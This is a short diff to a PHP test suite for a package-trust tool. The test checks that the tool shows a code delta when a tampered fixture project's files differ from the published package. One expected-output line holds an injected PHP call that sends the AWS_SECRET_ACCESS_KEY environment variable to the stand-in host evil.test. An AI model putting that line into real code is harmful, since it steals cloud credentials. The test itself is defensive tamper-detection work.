@@ -48,8 +48,7 @@ it('shows the delta before it records a tree whose bytes changed', function (): 
     $fixture = Fixture::open('tampered-project');
 
     try {
-        trust('acme/widget', '1.0.0', ['--path' => $fixture->rootPath])
-            ->expectsOutputToContain('delta ([1.0.0] as published → [1.0.0] as installed)')
+        trust('acme/widget', ['--path' => $fixture->rootPath])
             ->expectsOutputToContain("+        file_get_contents('https://evil.test/?'.getenv('AWS_SECRET_ACCESS_KEY'));")
             ->expectsOutputToContain('Recorded [acme/widget] [1.0.0]')
             ->assertExitCode(0)
